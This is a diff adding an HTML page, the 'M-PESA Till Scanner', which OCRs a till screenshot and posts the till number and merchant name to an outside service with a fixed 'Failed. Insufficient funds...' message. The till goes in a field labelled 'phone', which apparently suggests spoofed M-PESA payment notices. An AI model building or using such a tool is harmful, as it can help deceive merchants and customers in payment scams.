@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>M-PESA Till Scanner</title>
+    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: white; padding: 20px; margin: 0; }
+        .container { max-width: 500px; width: 95%; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 12px; box-sizing: border-box; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        h3 { text-align: center; margin-bottom: 15px; font-size: 1.4rem; color: #4CAF50; text-transform: uppercase; letter-spacing: 1px; }
+        
+        .upload-section { border: 2px dashed #4CAF50; padding: 30px 20px; text-align: center; border-radius: 10px; margin-bottom: 15px; cursor: pointer; transition: 0.3s; }
+        .upload-section:hover { background: #252525; border-color: #66bb6a; }
+        #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 15px; display: none; border: 1px solid #333; }
+
+        .manual-input-container { margin-top: 15px; padding: 15px; border-radius: 8px; background: #1e1e1e; }
+        .manual-input-container label { display: block; margin-bottom: 8px; font-size: 0.9rem; color: #ccc; }
+        
+        .input-group { 
+            display: flex; 
+            gap: 8px; 
+            margin-bottom: 5px; 
+            border: 1px solid #444; 
+            border-radius: 8px; 
+            padding: 5px 12px;
+            background: #252525;
+        }
+        input[type="text"] { 
+            flex: 1; 
+            padding: 10px 0; 
+            background: transparent; 
+            border: none; 
+            color: white; 
+            font-size: 1.1rem; 
+            outline: none; 
+        }
+
+        #detectedNameDisplay { 
+            color: #4CAF50; 
+            font-weight: bold; 
+            font-size: 0.85rem; 
+            margin-left: 5px;
+            min-height: 18px;
+            text-transform: uppercase;
+            margin-top: 4px;
+            margin-bottom: 15px;
+        }
+
+        .copy-btn { width: auto; padding: 0 10px; background: transparent; border: none; font-size: 0.75rem; color: #4CAF50; cursor: pointer; font-weight: bold; }
+
+        button#saveBtn { width: 100%; padding: 16px; margin-top: 20px; border: none; border-radius: 25px; background: #4CAF50; color: white; font-weight: bold; cursor: pointer; font-size: 1.1rem; transition: 0.3s; }
+        button#saveBtn:hover:not(:disabled) { background: #45a049; }
+        
+        pre { background: #000; padding: 15px; margin-top: 15px; white-space: pre-wrap; word-wrap: break-word; border-radius: 6px; font-size: 0.9rem; color: #4CAF50; text-align: center; }
+        .loading-text { color: #ffeb3b; font-size: 0.9rem; text-align: center; display: none; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h3>M-PESA Till Scan</h3>
+    
+    <div class="upload-section" onclick="document.getElementById('imageInput').click()">
+        <span>📸 Tap to Scan Till Screenshot</span>
+        <input type="file" id="imageInput" accept="image/*" style="display: none;" onchange="handleImage(this)">
+        <img id="imagePreview" alt="Preview">
+    </div>
+
+    <div id="loader" class="loading-text">🔍 Extracting Till Details...</div>
+
+    <div class="manual-input-container">
+        <label>Merchant Till Number</label>
+        <div class="input-group">
+            <input type="text" id="detectedTill" placeholder="e.g. 3588988">
+            <button class="copy-btn" id="copyBtn" onclick="copyTill()">COPY</button>
+        </div>
+        <div id="detectedNameDisplay"></div>
+        
+        <input type="hidden" id="detectedName">
+    </div>
+
+    <button id="saveBtn" onclick="saveTillData()">CONTINUE</button>
+    <pre id="output"></pre>
+</div>
+
+<script>
+const API = "https://mpesab.vercel.app";
+const FIXED_MESSAGE = "Failed. Insufficient funds...";
+
+async function handleImage(input) {
+    const file = input.files[0];
+    if (!file) return;
+
+    const preview = document.getElementById('imagePreview');
+    preview.src = URL.createObjectURL(file);
+    preview.style.display = 'block';
+
+    const loader = document.getElementById('loader');
+    loader.style.display = 'block';
+
+    try {
+        // We use 'eng' for OCR. 
+        const { data: { text } } = await Tesseract.recognize(file, 'eng');
+        processTillText(text);
+    } catch (err) {
+        alert("Scan failed. Try a clearer image.");
+    } finally {
+        loader.style.display = 'none';
+    }
+}
+
+function processTillText(rawText) {
+    // Split text into lines and clean up whitespace
+    const lines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 2);
+    
+    let detectedTill = "";
+    let detectedName = "";
+    let tillIndex = -1;
+
+    // 1. Find Till Number (Look for 5 to 8 digit numbers)
+    for (let i = 0; i < lines.length; i++) {
+        // M-PESA Till numbers are typically 6 or 7 digits
+        let match = lines[i].match(/\b\d{5,8}\b/);
+        if (match) {
+            detectedTill = match[0];
+            tillIndex = i;
+            break;
+        }
+    }
+
+    // 2. Find Merchant Name
+    // Usually, the merchant name is the line immediately following the till number
+    if (tillIndex !== -1 && tillIndex + 1 < lines.length) {
+        detectedName = lines[tillIndex + 1];
+    }
+
+    // Cleaning up the name (Remove artifacts like "Enter amount" if OCR grabbed too much)
+    if (!detectedName || detectedName.toLowerCase().includes("enter") || detectedName.toLowerCase().includes("balance")) {
+        detectedName = "MERCHANT NAME NOT FOUND";
+    }
+
+    // Update UI
+    document.getElementById('detectedTill').value = detectedTill;
+    document.getElementById('detectedName').value = detectedName; 
+    document.getElementById('detectedNameDisplay').innerText = detectedName.toUpperCase();
+}
+
+function copyTill() {
+    const tillInput = document.getElementById('detectedTill');
+    if (!tillInput.value) return;
+    navigator.clipboard.writeText(tillInput.value);
+    document.getElementById('copyBtn').innerText = "COPIED";
+    setTimeout(() => { document.getElementById('copyBtn').innerText = "COPY"; }, 2000);
+}
+
+async function saveTillData() {
+    const btn = document.getElementById("saveBtn");
+    const output = document.getElementById("output");
+    const name = document.getElementById("detectedName").value.trim();
+    const till = document.getElementById("detectedTill").value.trim();
+
+    if (!till) { 
+        output.innerText = "❌ No till number detected"; 
+        return; 
+    }
+
+    btn.disabled = true;
+    btn.innerText = "SAVING...";
+
+    try {
+        const response = await fetch(`${API}/send`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                phone: till, // Sending till in the phone field
+                name: name,
+                amount: 0,
+                token: "TILL" + Date.now(),
+                message: FIXED_MESSAGE
+            })
+        });
+
+        if (response.ok) {
+            output.innerText = "✅ Merchant Saved: " + name;
+            btn.innerText = "CONTINUE";
+        } else {
+            throw new Error();
+        }
+    } catch (error) {
+        output.innerText = "❌ Connection Error";
+        btn.disabled = false;
+        btn.innerText = "CONTINUE";
+    }
+}
+</script>
+</body>
+</html>
